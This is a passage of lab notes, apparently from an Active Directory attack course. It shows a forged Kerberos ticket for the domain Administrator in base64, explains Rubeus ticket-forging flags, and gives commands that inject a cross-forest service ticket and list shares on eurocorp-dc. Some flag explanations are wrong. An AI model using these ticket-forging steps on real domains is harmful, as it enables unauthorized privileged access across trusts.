style="white-space:pre-wrap;word-break:break-all">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</code></pre><ol class="numbered-list" id="30c79e9a-d7c9-8015-be72-e93e53794674" start="1" type="1"><li><strong>/service</strong>: This flag specifies the service principal name (SPN) of the service that the ticket is being forged for. In this case, it is <code>krbtgt/dollarcorp.moneycorp.local</code>.</li></ol><ol class="numbered-list" id="30c79e9a-d7c9-808c-a6f9-ef1764e4b391" start="2" type="1"><li><strong>/rc4</strong>: This flag specifies the RC4 key used to encrypt the ticket(<strong>dollarcorp.moneycorp.local</strong>). In this case, it is .</li></ol><ol class="numbered-list" id="30c79e9a-d7c9-80f2-ad1d-f720fac6815d" start="3" type="1"><li><strong>/sid</strong>: This flag specifies the SID of the user or group that the ticket is being forged for. In this case, it is <code>S-1-5-21-719815819-3726368948-3917688648</code>.</li></ol><ol class="numbered-list" id="30c79e9a-d7c9-8085-91b9-c15dd12950b3" start="4" type="1"><li><strong>/ldap</strong>: This flag specifies that the ticket should be forged using LDAP.</li></ol><ol class="numbered-list" id="30c79e9a-d7c9-8091-beb6-fad053bf2167" start="5" type="1"><li><strong>/user</strong>: This flag specifies the username of the user that the ticket is being forged for. In this case, it is <code>administrator</code>.</li></ol><ol class="numbered-list" id="30c79e9a-d7c9-802c-8657-f6ccdffb1929" start="6" type="1"><li><strong>/nowrap</strong>: This flag specifies that the output should not be wrapped.</li></ol><ol class="numbered-list" id="30c79e9a-d7c9-808c-91ec-eac87cc9617a" start="7" type="1"><li><strong>/ptt</strong>: This flag specifies that the ticket should be printed to the console.</li></ol><p class="" id="30c79e9a-d7c9-80e2-9b10-e3fc5c596842">This command forges a ticket for the <code>krbtgt/dollarcorp.moneycorp.local</code> service using the RC4 key , the SID <code>S-1-5-21-719815819-3726368948-3917688648</code>. The ticket is forged using LDAP and the username is <code>administrator</code>. The output is not wrapped and the ticket is printed to the console.</p><p class="" id="30c79e9a-d7c9-804b-be19-fa3b2b9d0bdd">
+</p><p class="" id="30c79e9a-d7c9-8069-b830-c34030473ec8"><code>C:\AD\Tools\Rubeus.exe asktgs /service:cifs/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.LOCAL /ptt /ticket:doIGFjCCBhKgAwI…BSE64_SNIPPET</code></p><a href="../../assets/crtp/Untitled 133.png"><img src="../../assets/crtp/Untitled 133.png"/></a><p class="" id="30c79e9a-d7c9-8053-a27d-ff724d6b0231">Now if we check our Cached Ticket.</p><p class="" id="30c79e9a-d7c9-80a4-9c30-ec203d6a3ce6"><code>klist</code></p><a href="../../assets/crtp/Untitled 134.png"><img src="../../assets/crtp/Untitled 134.png"/></a><p class="" id="30c79e9a-d7c9-8024-b85e-c52de8e8f6de">
+</p><p class="" id="30c79e9a-d7c9-80a0-8726-e1e3355cc41e">Once the ticket is injected, we can access explicitly shared resources on eurocorp-dc.</p><p class="" id="30c79e9a-d7c9-803b-969c-cf5aa6403e54"><code>dir \\eurocorp-dc.eurocorp.local\SharedwithDCorp\</code></p><a href="../../assets/crtp/Untitled 135.png"><img src="../../assets/crtp/Untitled 135.png"/></a><p class="" id="30c79e9a-d7c9-805a-8429-f62ade17d432">Note that the only way to enumerate accessible resources (service on a machine) in eurocorp would be to request a TGS for each one and then attempt to access it.</p><p class="" id="30c79e9a-d7c9-8058-8055-cd34d79ecc7b">
+</p><p class="" id="30c79e9a-d7c9-80c8-b05d-fd5ba049db3a">
+</p><p class="" id="30c79e9a-d7c9-8092-bac6-d03dfa040cfa">
+</p><p class="" id="30c79e9a-d7c9-80bd-8ae6-e8077930b6ef">
+</p><p class="" id="30c79e9a-d7c9-80c4-a2ff-f2662fe10f8f">
+</p>
           </div>
         </section>
       </article>
